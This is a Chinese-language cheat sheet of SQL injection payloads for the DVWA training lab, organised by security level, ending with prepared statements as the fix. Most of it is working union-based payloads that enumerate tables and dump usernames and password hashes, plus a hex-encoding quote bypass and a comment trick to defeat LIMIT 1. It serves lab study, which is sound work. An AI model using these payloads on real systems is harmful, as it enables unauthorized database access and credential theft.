# DVWA SQL 注入 · Payload 复习手册

> 仅用于 DVWA 本地授权靶场学习，严禁对未授权目标测试
> 适用：DVWA 官方版

## Low —— 无过滤

### 特点
后端无任何过滤，用户输入直接拼进 SQL，最基础的字符型注入。

### Payload

| 目的 | Payload |
|---|---|
| 验证漏洞 | `1'`（触发 SQL 语法报错） |
| 验证可控 | 真：`1' and 1=1 #` ／ 假：`1' and 1=2 #` |
| 判断字段数 | `1' order by 2 #` ／ `1' order by 3 #`（3 报错 → 共 2 列） |
| 确认回显位 | `-1' union select 1,2 #` |
| 库名 + 版本 | `-1' union select database(), version() #` |
| 所有表名 | `-1' union select 1, group_concat(table_name) from information_schema.tables where table_schema=database() #` |
| users 表字段 | `-1' union select 1, group_concat(column_name) from information_schema.columns where table_name='users' #` |
| 脱库 | `-1' union select user, password from users #` |

## Medium —— 基础转义

### 特点
1. 用 `mysqli_real_escape_string()` 转义了单引号
2. 提交方式改为 **POST**，SQL 里 ID 为数字型，**不需要单引号闭合**
3. 无关键词过滤

源码：`$id = mysqli_real_escape_string(..., $_POST['id']);  $query = "... WHERE user_id = $id;";`

### Payload（去掉单引号，直接拼接）

| 目的 | Payload |
|---|---|
| 验证漏洞 | `1 and 1=1` ／ `1 and 1=2` |
| 判断字段数 | `1 order by 2` ／ `1 order by 3` |
| 确认回显位 | `-1 union select 1,2` |
| 库名 + 版本 | `-1 union select database(), version()` |
| 所有表名 | `-1 union select 1, group_concat(table_name) from information_schema.tables where table_schema=database()` |
| users 表字段 | `-1 union select 1, group_concat(column_name) from information_schema.columns where table_name=0x7573657273` |
| 脱库 | `-1 union select user, password from users` |

> 技巧：`table_name='users'` 里的引号会被转义，可用十六进制 **`0x7573657273`**（= `users`）绕过。

## High —— LIMIT 1 + 输入输出分离

### 特点（据官方源码）
1. 输入先存进 `$_SESSION`，再在结果页读出显示（弹窗式提交）
2. SQL 末尾加了 **`LIMIT 1`**
3. **没有**关键词正则过滤，**没有**预处理语句 —— 网上不少教程说的"High 用正则拦截 union select"属于误传 / 魔改版，官方版并非如此

### Payload

| 目的 | Payload |
|---|---|
| 验证漏洞 | `1'` |
| 绕过 LIMIT 1 | `1' union select 1,2 #` |
| 判断字段数 | `1' order by 2 #` ／ `1' order by 3 #` |
| 确认回显位 | `-1' union select 1,2 #` |
| 库名 + 版本 | `-1' union select database(), version() #` |
| 所有表名 | `-1' union select 1, group_concat(table_name) from information_schema.tables where table_schema=database() #` |
| users 表字段 | `-1' union select 1, group_concat(column_name) from information_schema.columns where table_name='users' #` |
| 脱库 | `-1' union select user, password from users #` |

> 关键：`#`（或 `-- `）把末尾的 ` LIMIT 1` 注释掉，让 UNION 的结果能出来。

## Impossible —— 预编译

### 特点
后端使用 **PDO 预处理语句**（`prepare` + `bindParam`），并先做 `is_numeric` 校验，SQL 结构与用户数据彻底分离，**不存在 SQL 注入**。这是 SQL 注入的终极防御方案。

（此级别没有任何可用 Payload。）
